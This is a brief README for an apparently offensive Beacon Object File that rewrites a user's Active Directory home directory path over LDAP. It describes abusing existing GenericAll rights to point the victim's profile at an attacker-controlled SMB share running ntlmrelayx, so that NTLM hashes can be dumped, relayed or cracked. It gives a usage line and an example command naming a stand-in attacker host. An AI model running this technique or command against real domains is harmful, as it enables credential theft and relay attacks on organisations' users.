BOF (*x64 only*) - *Home Directory* path modification via LDAP 

**Description**: leverage existing 'GenericAll' AD rights over an object (ie: user)
             to set their profile to an attacker smb server (ie: ntlmrelayx) to dump hashes, 
             relay, or crack.

**Usage**: home_mod \<username\> \<drive letter\> \<attacker share\>

**Example**: home_mod jblogg N \\\\attackerip\\bogus_share
